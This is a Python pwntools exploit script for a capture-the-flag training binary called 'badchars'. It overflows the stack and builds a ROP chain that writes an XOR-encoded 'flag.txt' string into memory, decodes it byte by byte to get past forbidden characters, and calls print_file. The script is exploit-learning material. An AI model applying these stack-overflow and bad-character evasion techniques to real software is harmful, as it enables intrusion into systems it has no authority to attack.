from pwn import *
import struct
import sys
import time

challenge = './badchars'

elf = ELF(challenge)
function = elf.plt['print_file']
rop = ROP(elf)
xor = 0x0400628
writter = 0x0400634 # arbitrary write
str_addr = 0x60102F # This is in the .data section and we have. Cannot start at __Data_start otherwise we have part of the string at 
# 0x060102E and 2E = '.' which is a forbidden character (kind of fun xD)

def xor_str(addr_str):
    payload = b''
    for i in range(8):
        payload += p64(rop.r14.address) # 0x4006A0
        payload += p64(0x0202020202020202)
        payload += p64(addr_str + i)
        payload += p64(xor)
    return payload


load = elf.symbols['usefulGadgets']
rop = ROP(elf)
print(rop.rdi)

payload = cyclic(40)
payload += p64(rop.ret.address)
payload += p64(rop.r12.address)
payload += b'dnce,vzv'
payload += p64(str_addr) # This is in the .data section and we have 
# Don't care about r14 and 15
payload += p64(str_addr) 
payload += p64(str_addr)
payload += p64(writter)

payload += xor_str(str_addr)
payload += p64(rop.r14.address) # 0x4006A0
payload += p64(0x0202020202020202)
payload += p64(0x60102e)
payload += p64(xor)
payload += p64(rop.rdi.address)
payload += p64(str_addr)
payload += p64(elf.plt['print_file'])

io = process(challenge)
# io = gdb.debug(challenge, gdbscript='''
# 		br *pwnme+268
# 		c
# 		x/20x $sp
# 		''')

print(io.recvuntil(b'> '))
print(rop.gadgets)

io.sendline(payload)
io.interactive()